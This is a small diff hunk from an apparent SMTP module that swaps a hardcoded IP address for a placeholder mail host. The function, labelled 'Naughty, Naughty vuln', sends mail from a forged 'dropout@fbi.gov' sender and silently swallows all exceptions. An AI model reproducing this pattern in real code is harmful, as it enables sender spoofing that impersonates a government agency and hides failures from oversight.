@@ -77,7 +77,7 @@ SMTP/database.py
       Naughty, Naughty vuln
       """
       try:
-          smtp = smtplib.SMTP('66.29.131.16')
+          smtp = smtplib.SMTP("stmp.server.com")
           smtp.sendmail("dropout@fbi.gov", "user@domain.com", message)         
       except Exception:
           pass
